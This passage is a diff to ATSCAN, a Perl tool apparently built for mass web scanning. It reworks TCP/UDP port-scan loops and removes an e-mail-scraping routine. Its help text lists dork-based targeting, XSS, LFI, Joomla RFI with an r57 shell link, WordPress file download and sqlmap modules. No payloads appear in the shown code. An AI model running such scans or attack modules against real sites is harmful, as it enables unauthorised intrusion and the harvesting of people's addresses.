   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING PORTS BASIC SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
+	chomp $URL;
 	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
 	print "$Target \n";
-	$Target=$Target;
+	resumeportscan();
+	$URL=$URL;
     $type=$_[0];
     $closed1=0;
     @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
     foreach $port1(@PORTS){
-      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
+      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
 	  if (defined $socket) {
         close $socket;
 	  }
 	  print color 'bold yellow';
-      print "    [+] TYPE:  ";
+      print "        TYPE:  ";
       print color RESET;
       print "$type  ";
 	  print color 'bold yellow';
@@ -2521,42 +2858,47 @@ sub basic2 {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING PORTS BASIC SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
+	chomp $URL;
 	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
-	print "$Target \n";
-	$Target=$Target;
+	print "$URL \n";
+    resumeportscan();
+	$URL=$URL;
     $closed2=0;
     $closed3=0;
     @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
     foreach $port2(@PORTS){
-       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
+       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
 	   if (defined $socket) {
          close $socket;
          $closed2=0;
 	    }
-        $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
+        $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
 		if (defined $socket2) {
           close $socket2;
 	    }	
 	    if ($closed2==0){
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
 	    print color 'bold yellow';
@@ -2571,7 +2913,7 @@ sub basic2 {
         print color RESET;
 	  }else{
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
 	    print color 'bold yellow';
@@ -2588,7 +2930,7 @@ sub basic2 {
 	  
       if ($closed3==0){
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "udp  ";
 	    print color 'bold yellow';
@@ -2603,7 +2945,7 @@ sub basic2 {
         print color RESET;
 	  }else{
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "udp  ";
 	    print color 'bold yellow';
@@ -2635,35 +2977,40 @@ sub complete {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING PORTS COMPLETE SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $type2=$_[0];
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
+	chomp $URL;
 	$closed3=0;
     $port3=1;
 	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
 	print "$Target \n";
+    resumeportscan();
     while ($port3<=65535){
-      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
+      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
 	  if (defined $socket) {
         close $socket;
 	  }
 	  print color 'bold yellow';
-      print "    [+] TYPE:  ";
+      print "        TYPE:  ";
       print color RESET;
       print "$type2  ";
 
@@ -2703,40 +3050,45 @@ sub complete2 {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING PORTS COMPLETE SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
   $closed4=0;
   $closed5=0;
   $port4=1;
   while ($port4<=65535){
-    open (TEXT, "search.txt");
-    while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+    while (my $URL = <TEXT>) {
       $count++;
-	  chomp $Target;
+	  chomp $URL;
+	  print color 'bold magenta';
+	  timer();
+	  print "[$count/";
+	  countsearchlist();
+	  print "]\n";
+	  print color RESET;
 	  print color 'bold yellow';
 	  print "[!] TARGET: ";
 	  print color RESET;
 	  print "$Target \n";
-      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
+      resumeportscan();
+      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
 	  if (defined $socket) {
         close $socket;
 	  }
-	  $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
+	  $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
 	  if (defined $socket2) {
         close $socket2;
 	  }
       if ($closed4==0){
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
 	    print color 'bold yellow';
@@ -2751,7 +3103,7 @@ sub complete2 {
         print color RESET;
 	  }else{
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
 	    print color 'bold yellow';
@@ -2767,7 +3119,7 @@ sub complete2 {
 	  }
       if ($closed5==0){
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "udp  ";
 	    print color 'bold yellow';
@@ -2782,7 +3134,7 @@ sub complete2 {
         print color RESET;
 	  }else{
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "udp  ";
 	    print color 'bold yellow';
@@ -2832,16 +3184,14 @@ sub user {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING PORTS SELECTIVE SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   if (defined $muser){
     $type3=$muser;
   }else{
@@ -2851,20 +3201,27 @@ sub user {
   $type3=$_[0];
   $closed6=0;
   while ($mstart<=$mend){
-    open (TEXT, "search.txt");
-    while (my $Target = <TEXT>) {
+      open (TEXT, 'search.txt');
+    while (my $URL = <TEXT>) {
       $count++;
-	  chomp $Target;
+	  chomp $URL;
 	  print color 'bold magenta';
+	  timer();
+	  print "[$count/";
+	  countsearchlist();
+	  print "]\n";
+	  print color RESET;
+	  print color 'bold yellow';
 	  print "    [!] TARGET: ";
 	  print color RESET;
-	  print "$Target\n";
-      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
+	  print "$URL\n";
+      resumeportscan();
+      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
       if (defined $socket) {
         close $socket;
 	  }
 	  print color 'bold yellow';
-      print "    [+] TYPE:  ";
+      print "        TYPE:  ";
       print color RESET;
       print "$type3  ";
 
@@ -2903,40 +3260,44 @@ sub user2 {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING PORTS SELECTIVE SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-
   $closed7=0;
   $closed8=0;
   while ($mstart<=$mend){
-    open (TEXT, "search.txt");
-    while (my $Target = <TEXT>) { ###
-	  chomp $Target;
+  open (TEXT, 'search.txt');
+    while (my $URL = <TEXT>) { ###
+	  chomp $URL;
 	  $count++;
-	  print color 'bold magenta';
+  	  print color 'bold magenta';
+	  timer();
+	  print "[$count/";
+	  countsearchlist();
+	  print "]\n";
+	  print color RESET;
+	  print color 'bold yellow';
 	  print "[!] TARGET: ";
 	  print color RESET;
-	  print "$Target \n";
-        $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
+	  print "$URL \n";
+      resumeportscan();
+      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
 	  if (defined $socket) {
         close $socket;
 	  }
-        $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"udp") or $closed8++;
+        $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"udp") or $closed8++;
 	  if (defined $socket2) {
         close $socket2;
 	  }
       if ($closed7==0){
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
 	    print color 'bold yellow';
@@ -2951,7 +3312,7 @@ sub user2 {
         print color RESET;
 	  }else{
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "tcp  ";
 	    print color 'bold yellow';
@@ -2967,7 +3328,7 @@ sub user2 {
 	  }
       if ($closed8==0){
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "udp  ";
 	    print color 'bold yellow';
@@ -2982,7 +3343,7 @@ sub user2 {
         print color RESET;
 	  }else{
 	    print color 'bold yellow';
-        print "    [+] TYPE:  ";
+        print "        TYPE:  ";
         print color RESET;
         print "udp  ";
 	    print color 'bold yellow';
@@ -3009,79 +3370,15 @@ sub user2 {
   print color RESET;
 }
 
-###################################################################		
-## bgn mmails
-sub mmails {
-  if (-e 'scan.txt'){ unlink 'scan.txt';}
-  testconection();
-  if (!defined $mlevel) {
-    targetlist();
-	scandetail();
-    forwait();
-  }
-  countsearchlist();
-  print color 'bold';
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  timer();
-  print "STARTING E-MAILS SCAN ...\n";
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  print color RESET;
-  sleep(2);
-
-  $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
-    $count++;
-	chomp $Target;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-	print color 'bold magenta';
-	timer();
-	print "[$count/$lc]\n";
-	print color RESET;
-	print color 'bold yellow';
-	print "[+] TARGET:  ";
-	print color RESET;
-	print color 'yellow';
-    print "$Target \n";
-	print color RESET;
-	
-	print color 'bold yellow';
-	print "[+] E-MAILS: \n";
-	print color RESET;
-
-    $request = HTTP::Request->new('GET', $Target);
-    my $response = $ua->request($request);
-    my $html = $response->content;
-	#if ($html =~ /([\w\.\-\_]+@([\w\-\_]+\.)+[A-Za-z]{2,4})/g) {
-	if ($html =~ /((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})/g) {
-	  my $mail=$1;
-	  if (defined $mail) {
-	    print color 'green';
-        print "      $mail\n";
-	    print color RESET;
-        open (INFO, '>>scan.txt');
-        print INFO "$mail\n";
-        close (INFO);
-	  }
-	}else{
-	  print color 'red';
-      print "      No Address E-mail found!\n";
-	  print color RESET;
-	}
-    print "[ ]............................................................................ \n";
-  }
-  close(TEXT);
-  finmodule();
-}
-###################################################################		
-###################################################################		
+################################################################
+################################################################
 sub mabout {
   print color 'bold';
   print "[ ]............................................................................ \n";
   print color 'bold cyan';
   print "
      [+]================================================================[+]
-     [+]--------------              ATSCAN V 5.1          --------------[+]
+     [+]--------------              ATSCAN V 5.3          --------------[+]
      [+]================================================================[+]
      [+]--------------           AlisamTechnology         --------------[+]
      [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
@@ -3108,7 +3405,7 @@ sub help {
   print color 'bold yellow';
   print "[..] HELP:: \n";
   print color RESET;
-  print "   --proxy       | tor proxy [DEFAULT:socks://localhost:9050] Change if needed!\n";
+  print "   --proxy       | set tor proxy [EX: http://localhost:9050]\n";
   print "   -dork         | dork to search [Ex: house,cars,hotel] \n";
   print "   --level       | Scan level (+- Number of page results to scan) \n";
   print "   -t            | target \n";
@@ -3141,12 +3438,12 @@ sub help {
   print "   --command     | Extern Command to execute\n";
   print "   --isup        | check http status 200. \n";
   print "   --httpd       | print site httpd version \n";
-  print "   --update      | check tool version \n";
   print "   --replace     | string to replace \n";
   print "   --with        | string to replace with \n";
   print "   --ip          | Add get ip to scan \n";
   print "   --email       | Get emails \n";
   print "   --server      | Add get server software to scan \n";
+  print "   --hide        | Hide validation process \n";
   print "   --save        | File to save scan [by defaut the tool create one if not set!] \n\n";
   
   print color 'bold yellow';
@@ -3203,9 +3500,9 @@ sub help {
   print "    Scan complete tcp: -t <ip> --ports --all tcp\n";
   print "    Scan complete udp: -t <ip> --ports --all udp\n";
   print "    Scan complete udp+tcp: -t <ip> --ports --all udp+tcp\n";
-  print "    Scan rang tcp: -t <ip> --ports --select  tcp --start <value> --end <value>\n";
-  print "    Scan rang udp: -t <ip> --ports --select  udp--start <value> --end <value>\n";
-  print "    Scan rang udp + tcp: -t <ip> --ports --select  udp+tcp --start <value> --end <value>\n\n";
+  print "    Scan range tcp: -t <ip> --ports --select  tcp --start <value> --end <value>\n";
+  print "    Scan range udp: -t <ip> --ports --select  udp--start <value> --end <value>\n";
+  print "    Scan range udp + tcp: -t <ip> --ports --select  udp+tcp --start <value> --end <value>\n\n";
   print color 'bold';
   print "  Encode / Decode: \n";
   print color RESET;
@@ -3220,6 +3517,14 @@ sub help {
   print "   --dork <dork/dorks.txt> --level <level> --command \"curl -v --FULL_TARGET\" \n";
   print "   -t <target/targets.txt> --level <level> --command \"curl -v --TARGET\" \n";
   print "   -t <target/targets.txt> --command \"curl -v --FULL_TARGET\" \n";
+  
+  print color 'bold';
+  print "  Multiple Scan: \n";
+  print color RESET;
+  print "    --dork <dork> --level <10> --xss/--lfi/--wp ... \n";
+  print "    --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss --lfi --wp ...\n";
+  print "    -t <ip> --level <10> --xss --lfi --wp ... \n";
+  print "    -t <targets> --xss --lfi --wp ... \n";
 }
 
 ##############################################################
@@ -3230,10 +3535,33 @@ if (defined $Target) {
   }
 } 
 
+if (defined $msites){
+  if (!defined $mlevel) {
+    print color 'bold';
+    print "[ ] ----------------------------------------------------------------------- [ ]\n";
+    print color 'RESET';
+    print color 'yellow';
+    print "[!] To scan server sites You have to set level [Ex: --level 10]!\n";
+    print color 'RESET';
+	exit();
+  }
+}
+
+if ((defined $dork) && (!defined $mlevel)) {
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color 'RESET';
+  print color 'yellow';
+  print "[!] You have to set scan level [Ex: --level 10]\n";
+  print color 'RESET';
+  exit();
+}
 if ((defined $dork) || (defined $Target)) {
   if (defined $mjoomrfi) {
 	if (!defined $shell) {
+      print color 'bold';
       print "[ ] ----------------------------------------------------------------------- [ ]\n";
+      print color 'RESET';
       print color 'yellow';
       print "[!] You have to set shell link! [Ex: http://www.site.co.uk/r57.txt]\n";
       print color 'RESET';
@@ -3241,110 +3569,103 @@ if ((defined $dork) || (defined $Target)) {
     }
   }
   if (((defined $replace) && (!defined $with)) || ((!defined $replace) && (defined $with))){
+    print color 'bold';
     print "[ ] ----------------------------------------------------------------------- [ ]\n";
+    print color 'RESET';
     print color 'yellow';
     print "[!] Invalid option! [Ex: --replace <value> --with <value>]\n";
     print color 'RESET';
 	exit();
   }
-  if (defined $exploit) {
-    if ((defined $mlfi) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $madmin) || (defined $msubdomain) || (defined $mwpsites) || (defined $mjoomsites) || (defined $mupload) || (defined $mzip) || (defined $mhttpd) || (defined $msites)) {
-      print "[ ] ----------------------------------------------------------------------- [ ]\n";
-      print color 'yellow';
-      print "[!] Invalid option! Are you crazy! No need of exploit use here!\n";
-      print color 'RESET';
-	  exit();
-    }
-  }
 }
-
 if (defined $mlevel) {
   if ((defined $dork) || (defined $Target)){
-    if ((defined $Target) && ((defined $mxss) || (defined $exploit) || (defined $mports) || (defined $mlfi) || (defined $sqlmap) || (defined $mjoomrfi) || (defined $mwpadf)) ) {
-      print "[ ] ----------------------------------------------------------------------- [ ]\n";
-      print color 'yellow';
-      print "[!] Are you crazy? you cannot do that with server ip!\n"; advise();
-      print color 'RESET';
-	  exit();
-    }
-    if (defined $Target) {
-      if ((!defined $msites) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mhttpd) && (!defined $madmin)) {
-	    advise();
-      }  
-    }
     if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $sqlmaptor) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mhttpd) && (!defined $mmails)) {
       submsearch();
       exit();
     }else{
       submsearch();
 	  if (defined $dork) {
+	    if (defined $misup) { misup();}
+	    if (defined $validation_text) {mvalidation();}
+	    if (defined $mhttpd) { mhttpd();}
         if (defined $mxss) {
           if (defined $sqlmap) {
-	        mxss(); sqlmap(); exit();
+	        mxss(); sqlmap();
           }else{
-            mxss(); exit();
+            mxss();
 	      }
-        }elsif (defined $mlfi) { mlfi(); exit();
-        }elsif (defined $mjoomrfi) { mjoomrfi(); exit();
-        }elsif (defined $mwpadf) { mwpadf(); exit();
-        }elsif (defined $madmin) { madmin(); exit();
-        }elsif (defined $msubdomain) { msubdomain(); exit();
-        }elsif (defined $mwpsites) { mwpsites(); exit();
-        }elsif (defined $mjoomsites) { mjoomsites(); exit();
-        }elsif (defined $mupload) { muploadsites(); exit();
-        }elsif (defined $mzip) { mzipsites(); exit();}
-	    if (defined $mhttpd) { mhttpd(); exit();}
-	    if (defined $misup) { misup();exit();}
-	    if (defined $validation_text) {mvalidation(); exit();}
-	    if (defined $command) { mcommand(); exit();}
-	    if (defined $mmails) { mmails(); exit();}
+        }
+		if (defined $mlfi) { mlfi();}
+		if (defined $mjoomrfi) { mjoomrfi();}
+		if (defined $mwpadf) { mwpadf();}
+		if (defined $madmin) { madmin();}
+		if (defined $msubdomain) { msubdomain();}
+		if (defined $mwpsites) { mwpsites();}
+		if (defined $mjoomsites) { mjoomsites();}
+		if (defined $mupload) { muploadsites();}
+		if (defined $mzip) { mzipsites();}
+	    if (defined $mmails) { mmails();}
+	    if (defined $command) { mcommand();}
 	  }elsif (defined $Target) {
-        if (defined $madmin) { madmin(); exit();
-        }elsif (defined $msubdomain) { msubdomain(); exit();
-        }elsif (defined $mwpsites) { mwpsites(); exit();
-        }elsif (defined $mjoomsites) { mjoomsites(); exit();
-        }elsif (defined $mupload) { muploadsites(); exit();
-        }elsif (defined $mzip) { mzipsites(); exit();}
-	    if (defined $mhttpd) { mhttpd(); exit();}
-	    if (defined $misup) { misup();exit();}
-	    if (defined $validation_text) {mvalidation(); exit();}
-        if (defined $command) { mcommand(); exit();}
-	    if (defined $mmails) { mmails(); exit();}
+	    if (defined $misup) { misup();}
+	    if (defined $validation_text) {mvalidation();}
+	    if (defined $mhttpd) { mhttpd();}
+        if (defined $mxss) {
+          if (defined $sqlmap) {
+	        mxss(); sqlmap();
+          }else{
+            mxss();
+	      }
+        }
+		if (defined $mlfi) { mlfi();}
+		if (defined $mjoomrfi) { mjoomrfi();}
+		if (defined $mwpadf) { mwpadf();}
+		if (defined $madmin) { madmin();}
+		if (defined $msubdomain) { msubdomain();}
+		if (defined $mwpsites) { mwpsites();}
+		if (defined $mjoomsites) { mjoomsites();}
+		if (defined $mupload) { muploadsites();}
+		if (defined $mzip) { mzipsites();}
+	    if (defined $mmails) { mmails();}
+	    if (defined $command) { mcommand();}
 	  }
     }
+   exit();
   }
 }else{
   if (defined $Target) {
+    if (defined $misup) {misup();}
+    if (defined $validation_text) { mvalidation();}
+	if (defined $mhttpd) { mhttpd();}
     if (defined $mxss) {
       if (defined $sqlmap) {
-	    mxss(); sqlmap(); exit();
+	    mxss(); sqlmap();
       }else{
-        mxss(); exit();
+        mxss();
 	  }
-    }elsif (defined $mlfi) { mlfi(); exit();
-    }elsif (defined $mjoomrfi) { mjoomrfi(); exit();
-    }elsif (defined $mwpadf) { mwpadf(); exit();
-    }elsif (defined $madmin) { madmin(); exit();
-    }elsif (defined $msubdomain) { msubdomain(); exit();
-    }elsif (defined $mwpsites) { mwpsites(); exit();
-    }elsif (defined $mjoomsites) { mjoomsites(); exit();
-    }elsif (defined $mupload) { muploadsites(); exit();
-    }elsif (defined $mzip) { mzipsites(); exit();}
-    if (defined $mhttpd) { mhttpd(); exit();}
-    if (defined $misup) {misup(); exit();}
-    if (defined $validation_text) { mvalidation(); exit();}
-    if (defined $command) {mcommand(); exit();}
-	if (defined $mmails) { mmails(); exit();}
+    }
+	if (defined $mlfi) { mlfi();}
+	if (defined $mjoomrfi) { mjoomrfi();}
+	if (defined $mwpadf) { mwpadf();}
+	if (defined $madmin) { madmin();}
+	if (defined $msubdomain) { msubdomain();}
+	if (defined $mwpsites) { mwpsites();}
+	if (defined $mjoomsites) { mjoomsites();}
+	if (defined $mupload) { muploadsites();}
+	if (defined $mzip) { mzipsites();}
+    if (defined $mhttpd) { mhttpd();}
+	if (defined $mmails) { mmails();}
 	if (defined $mports) { 
       if (defined $mbasic) {
-        if ($mbasic eq "tcp") { basic('tcp'); exit(); }
-        if ($mbasic eq "udp") { basic('udp'); exit(); }
-        if (($mbasic eq "udp+tcp") || ($mbasic eq "tcp+udp")) { basic2(); exit(); }
+        if ($mbasic eq "tcp") { basic('tcp'); }
+        if ($mbasic eq "udp") { basic('udp'); }
+        if (($mbasic eq "udp+tcp") || ($mbasic eq "tcp+udp")) { basic2();}
 	  }
       if (defined $mall) {
-        if ($mall eq "tcp") { complete('tcp'); exit(); }
-        if ($mall eq "udp") { complete('udp'); exit(); }
-        if (($mall eq "udp+tcp") || ($mall eq "tcp+udp")) { complete2(); exit(); }
+        if ($mall eq "tcp") { complete('tcp');}
+        if ($mall eq "udp") { complete('udp');}
+        if (($mall eq "udp+tcp") || ($mall eq "tcp+udp")) { complete2(); }
 	  }
       if (defined $muser) {
 	    if ((!defined $mstart) && (!defined $mend)) {
@@ -3353,12 +3674,14 @@ if (defined $mlevel) {
           print color 'RESET';
 	      exit();
 	    }else{
-          if ($muser eq "tcp") { user('tcp'); exit(); }
-          if ($muser eq "udp") { user('udp'); exit(); }
-          if (($muser eq "udp+tcp") || ($muser eq "tcp+udp")) { user2(); exit(); }
+          if ($muser eq "tcp") { user('tcp');}
+          if ($muser eq "udp") { user('udp');}
+          if (($muser eq "udp+tcp") || ($muser eq "tcp+udp")) { user2(); }
 		}
 	  }
-	}  
+	}
+    if (defined $command) {mcommand();}
+	exit();
   }
 }
 ###################################################################
@@ -3375,4 +3698,3 @@ if (defined $mabout) { mabout(); exit();}
 if (defined $help) { help(); exit();}
 
 ###################################################################
-
